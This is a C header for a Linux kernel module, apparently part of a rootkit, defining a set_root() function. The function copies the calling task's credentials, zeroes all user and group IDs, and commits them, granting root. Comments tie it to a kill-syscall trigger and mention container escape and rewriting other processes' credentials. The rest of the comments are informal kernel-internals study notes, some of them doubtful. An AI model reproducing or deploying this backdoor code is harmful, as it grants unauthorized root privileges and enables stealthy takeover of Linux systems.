#ifndef ROOT_SETTER_KITE
    #define ROOT_SETTER_KITE
    
    #include <linux/cred.h>
/*
can also try to change credentials of a process by finding the task_struct with find_vpid()
and changing the credentials with unlocking the rcu lock and read to then change task_struct->cred
as commit_creds_to does'nt exists since 2022.
**abort_creds() for freeing the allocated copy of credentials
**look into kernel container escape
This is a function that is being called with the kill syscall by a process,
Before executing the syscall handler, the kernel initializes the process context for the current process.
This involves setting up data structures such as the process descriptor (task_struct) and allocating a kernel stack for the process if needed.
The kernel also saves the current state of the process, including CPU registers and execution context, onto its kernel stack.
context switch with switch_to(). (current macro to get_current where the current stack pointer is in sp_el0)
**note preemption, ring levels, Task State Segment(context switch struct) and Descriptor Tables(local(now paging tables)/global)(arm CPSR, SPSR).{kernel shared memory is mapped to each process in the same addresses}
*/
static void set_root(void){
    struct cred *p_creds;
    p_creds = prepare_creds(); // get a COPY of the current task's credentials
    if(p_creds == NULL){
        return;
    }
    // alter the copy to root ids
    p_creds->uid.val = p_creds->gid.val = 0;
    p_creds->euid.val = p_creds->egid.val = 0;
    p_creds->suid.val = p_creds->sgid.val = 0;
    p_creds->fsuid.val = p_creds->fsgid.val = 0;

    commit_creds(p_creds); // commit the credentials to the task
}


#endif